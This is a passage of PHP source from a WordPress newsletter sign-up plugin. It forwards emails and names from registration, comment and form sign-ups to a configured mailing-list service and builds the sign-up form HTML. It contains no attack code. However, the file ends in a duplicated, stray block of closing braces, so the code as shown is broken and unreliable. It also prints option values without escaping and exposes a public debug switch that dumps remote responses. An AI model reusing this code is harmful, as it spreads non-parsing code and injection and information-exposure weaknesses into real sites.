			$postthis->add_additional_data(array_merge(array('email' => $email, 'name' => $name), $post_data)));

			$result = wp_remote_post($opts['form_action'],
				array( 'body' => $post_data ) 
			);	

			if(isset($_POST['_nsu_debug']) || isset($_GET['_nsu_debug'])) {
				var_dump($result); die();
			} 
			
		}
		
		// store a cookie, if preferred by site owner
		if(isset($opts['cookie_hide']) && $opts['cookie_hide'] == 1) @setcookie('ns_subscriber',TRUE,time() + 9999999);
                
        // Check if we should redirect to a given page
        if($type == 'form' && isset($this->options['form']['redirect_to']) && strlen($this->options['form']['redirect_to']) > 6) {
            wp_redirect( $this->options['form']['redirect_to']);
            exit;
        } elseif($type == 'checkbox' && isset($this->options['checkbox']['redirect_to']) && strlen($this->options['checkbox']['redirect_to']) > 6) {
            wp_redirect( $this->options['checkbox']['redirect_to']);
            exit;
        }
	
	}

	
	/** 
	* Returns array with additional data names as key, values as value. 
	* @param array $args, the normal form data (name, email, list variables)
	*/
	function add_additional_data($args = array())
	{
        $opts = $this->options['mailinglist'];
		$defaults = array(
			'format' => 'array',
			'api' => NULL
		);
		
		$args = wp_parse_args( $args, $defaults );

		if($args['format'] == 'query_string') {
		
			$add_data = "";
			if(isset($opts['extra_data']) && is_array($opts['extra_data'])) {
				foreach($opts['extra_data'] as $key => $value) {
					if($args['api'] == 'ymlp') $value['name'] = str_replace('YMP','Field', $value['name']);

					$value['value'] = str_replace("%%NAME%%", $args['name'], $value['value']);
					$value['value'] = str_replace("%%IP%%", $_SERVER['REMOTE_ADDR'], $value['value']);
					$add_data .= "&".$value['name']."=".$value['value'];
				}		
			}
			return $add_data;
		} 
		
		$add_data = array();
		if(isset($opts['extra_data']) && is_array($opts['extra_data'])) {
			foreach($opts['extra_data'] as $key => $value) {
				$value['value'] = str_replace("%%NAME%%", $args['name'], $value['value']);
				$value['value'] = str_replace("%%IP%%", $_SERVER['REMOTE_ADDR'], $value['value']);
				$add_data[$value['name']] = $value['value'];
			}		
		}

		return $add_data;
	}
	
	/**
	* Perform the sign-up for users that registered trough a MultiSite register form
	* This function differs because of the need to grab the emailadress from the user using get_userdata
	* @param int $user_id : the ID of the new user
	* @param string $password : the password, we don't actually use this
	* @param array $meta : the meta values that belong to this user, holds the value of our 'newsletter-sign-up' checkbox.
	*/
	function grab_email_from_ms_user_signup($user_id, $password = NULL,$meta = NULL){
		if(!isset($meta['newsletter-signup-do']) || $meta['newsletter-signup-do'] != 1) return;
		$user_info = get_userdata($user_id);
		
		$email = $user_info->user_email;
		$naam = $user_info->first_name;
		
		$this->send_post_data($email,$naam);
	}
	
	/**
	* Perform the sign-up for users that registered trough a MultiSite register form
	* This function differs because of the need to grab the emailadress from the user using get_userdata
    * @param int $blog_id The id of the new blow
	* @param int $user_id The ID of the new user
	* @param $a No idea, seriously.
    * @param $b No idea, seriously.
	* @param array $meta The meta values that belong to this user, holds the value of our 'newsletter-sign-up' checkbox.
	*/
	function grab_email_from_ms_blog_signup($blog_id, $user_id, $a, $b ,$meta){
		
		if(!isset($meta['newsletter-signup-do']) || $meta['newsletter-signup-do'] != 1) return;
		$user_info = get_userdata($user_id);
		
		$email = $user_info->user_email;
		$name = $user_info->first_name;
		
		$this->send_post_data($email,$name);
	}
	
	/**
	* Grab the emailadress (and name) from a regular WP or BuddyPress sign-up and then send this to mailinglist.
	*/
	function grab_email_from_wp_signup()
	{
		if($_POST['newsletter-signup-do'] != 1) return;
		
		if(isset($_POST['user_email'])) {
			
			// gather emailadress from user who WordPress registered
			$email = $_POST['user_email'];
			$name = $_POST['user_login'];
		
		} elseif(isset($_POST['signup_email'])) {
		
			// gather emailadress from user who BuddyPress registered
			$email = $_POST['signup_email'];
			$name = $_POST['signup_username'];

		} else { return; }
		
		$this->send_post_data($email,$name);
	}
	
	/**
	* Grab the emailadress and name from comment and then send it to mailinglist.
	* @param int $cid : the ID of the comment
	* @param object $comment : the comment object, optionally
	*/
	function grab_email_from_comment($cid,$comment = NULL)
	{
		if($_POST['newsletter-signup-do'] != 1) return;
		
		$cid = (int) $cid;
		
		// get comment data
		if(!is_object($comment)) $comment = get_comment($cid);

		// if spam, abandon function
		if($comment->comment_karma != 0) return;
		
		$email = $comment->comment_author_email;
		$name = $comment->comment_author;
		
		$this->send_post_data($email, $name);
	}
	
        /**
         * The NSU form shortcode function. Calls the output_form method
         * 
         * @param array $atts Not used
         * @param string $content Not used
         * @return string Form HTML-code 
         */
	function form_shortcode($atts = null,$content = null)
	{ 
		return $this->output_form(false);
	}
	
        /**
         * Generate the HTML for a form
         * @param boolean $echo Should HTML be echo'ed?
         * @return string The generated HTML 
         */
	public function output_form($echo = true)
	{
        $errors = $this->validation_errors;
		$opts = $this->options;
		$additional_fields = '';
		$output = '';
		
		$this->no_of_forms++;
		$formno = $this->no_of_forms;
		
		/* Set up form variables for API usage or normal form */
		if(isset($opts['mailinglist']['use_api']) && $opts['mailinglist']['use_api'] == 1) {
			
			/* Using API, send form request to ANY page */
			$form_action = "";
			$email_id = 'nsu_email';
			$name_id = 'nsu_name';
				
		} else {
				
			/* Using normal form request, set-up using configuration settings */
			$form_action = $opts['mailinglist']['form_action'];
			$email_id = $opts['mailinglist']['email_id'];
				
			if(isset($opts['mailinglist']['name_id'])) {
				$name_id = $opts['mailinglist']['name_id'];
			}
				
		}
			
		/* Set up additional fields */
		
		if(isset($opts['mailinglist']['extra_data']) && is_array($opts['mailinglist']['extra_data'])) :
			$additional_fields = '<div class="hidden">';
			foreach($opts['mailinglist']['extra_data'] as $ed) : 
				if($ed['value'] == '%%NAME%%') continue;
				$ed['value'] = str_replace("%%IP%%", $_SERVER['REMOTE_ADDR'], $ed['value']);
				$additional_fields .= "<input type=\"hidden\" name=\"{$ed['name']}\" value=\"{$ed['value']}\" />";
			endforeach; 
			$additional_fields .= "</div>";
		endif; 
		
		$email_label = (!empty($opts['form']['email_label'])) ? $opts['form']['email_label'] : 'E-mail:';
		$name_label = (!empty($opts['form']['name_label'])) ? $opts['form']['name_label'] : 'Name:';
                
        $email_value = (!empty($opts['form']['email_default_value'])) ? $opts['form']['email_default_value'] : '';
        $name_value = (!empty($opts['form']['name_default_value'])) ? $opts['form']['name_default_value'] : '';
                
		$submit_button = (!empty($opts['form']['submit_button'])) ? $opts['form']['submit_button'] : __('Sign-Up');
                
        $text_after_signup = (!empty($opts['form']['text_after_signup'])) ? $opts['form']['text_after_signup'] : 'Thanks for signing up to our newsletter. Please check your inbox to confirm your email address.';
		$text_after_signup = (isset($opts['form']['wpautop']) && $opts['form']['wpautop'] == 1) ? wpautop(wptexturize($text_after_signup)) : $text_after_signup;
                
                
		
		 if(!isset($_POST['nsu_submit']) || count($errors) > 0) { //form has not been submitted yet 
  
			$output .= "<form class=\"nsu-form\" id=\"nsu-form-$formno\" action=\"$form_action\" method=\"post\">";	
			if(isset($opts['mailinglist']['subscribe_with_name']) && $opts['mailinglist']['subscribe_with_name'] == 1) {	
				$output .= "<p><label for=\"nsu-name-$formno\">$name_label</label><input class=\"nsu-field\" id=\"nsu-name-$formno\" type=\"text\" name=\"$name_id\" value=\"$name_value\" ";
				if($name_value) $output .= "onblur=\"if(!this.value) this.value = '$name_value';\" onfocus=\"if(this.value == '$name_value') this.value=''\" ";
                $output .= "/>";
                if(isset($errors['name-field'])) $output .= '<span class="nsu-error error notice">'.$errors['name-field'].'</span>';
                $output .= "</p>";		
			} 
							
			$output .= "<p><label for=\"nsu-email-$formno\">$email_label</label><input class=\"nsu-field\" id=\"nsu-email-$formno\" type=\"text\" name=\"$email_id\" value=\"$email_value\" ";
            if($email_value) $output .= "onblur=\"if(!this.value) this.value = '$email_value';\" onfocus=\"if(this.value == '$email_value') this.value = ''\" ";
            $output .= "/>";
            if(isset($errors['email-field'])) $output .= '<span class="nsu-error error notice">'.$errors['email-field'].'</span>';
            $output .= "</p>";
			$output .= $additional_fields;
			$output .= "<p><input type=\"submit\" id=\"nsu-submit-$formno\" class=\"nsu-submit\" name=\"nsu_submit\" value=\"$submit_button\" /></p>";
			$output .= "</form>";
				
		} else { // form has been submitted
		
			$output = "<p id=\"nsu-signed-up-$formno\" class=\"nsu-signed-up\">$text_after_signup</p>";		
				
		 }
		 
		 if($echo) {
			echo $output;
		 } 
		
        return $output;
		 
	}
}
}   return $output;
		 
	}
}
}